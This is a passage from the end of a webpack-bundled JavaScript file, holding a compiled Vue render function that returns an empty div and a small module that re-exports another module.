module.exports={render:function (){var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;
  return _c("div")
},staticRenderFns: []}

/***/ }),
/* 6 */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(0);


/***/ })
/******/ ]);
});